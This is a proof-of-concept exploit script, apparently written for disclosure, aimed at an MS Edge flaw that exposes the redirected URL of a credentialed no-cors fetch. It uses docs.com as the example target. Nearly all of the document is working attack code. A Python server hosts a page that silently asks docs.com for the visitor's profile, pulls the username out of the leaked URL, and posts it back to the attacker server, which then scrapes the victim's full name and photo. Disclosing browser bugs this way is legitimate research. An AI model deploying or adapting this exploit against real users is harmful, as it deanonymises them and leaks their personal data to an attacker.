# This PoC demonstrates the extraction of confidential user information with MS Edge. 
# It works because MS Edge exposes the URL of a no-cors fetch request after following redirects.
# My target here is docs.com, but the issue is in no way specific to this website
# ================================================================
# To run
# Make sure you are logged in docs.com, then browse to the server

from BeautifulSoup import BeautifulSoup
import urllib2
import SimpleHTTPServer
import SocketServer
import json
PORT = 8021

class MyHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        try:
            url = self.rfile.read(int(self.headers['Content-Length']))
            print "Got URL of: %s" % url
            data = urllib2.urlopen(url).read()
            soup = BeautifulSoup(data)
            l = []
            name = soup.find("meta", property="og:title")
            picture = soup.find("meta", property="og:image")
            if name: l.append(name["content"])
            if picture: l.append(picture["content"])
            data = json.dumps(l)
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            self.wfile.write(data)
        except Exception as e:
            self.send_response(400)
            print e

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write('''
<html>
<body onload="ms()">
<h1 id="hello">Loading...</h1>
<h2 id="name"></h2>
<img id="picture" src="">
<script>
function ms()
{
    fetch ("https://docs.com/me", {
            mode: "no-cors",
            credentials: "include",
         }).then(function(response) {
                console.log(response); // If the request is successfull and the user is logged in response.url should be his user page
                set_user_data(response.url);
            }).catch(function(error) {
                console.log("Failed with: ", error);
            });
}

function set_user_data(url)
{
    if (!url) document.getElementById("hello").innerHTML = "Failed";
    else {
        // The username is in the URL itself
        var username = url.split("/")[3];
        document.getElementById("hello").innerHTML = "Hello " + username;
        console.log("Fetching meta...");
        // Try to get the user's full name and thumbnail
        fetch ("/", {method: "POST", body: url}).then(function(response) {
            return response.json();
        }).then(function (data) {
            console.log(data);
            document.getElementById("name").innerHTML = data[0];
            document.getElementById("picture").src = data[1];
        }).catch(function(error) {
            console.log("Failed normal fetch with: ", error);
        });
    }
}
</script>
</body>
</html>
''')

httpd = SocketServer.TCPServer(("", PORT), MyHandler)

print "serving at port", PORT
httpd.serve_forever()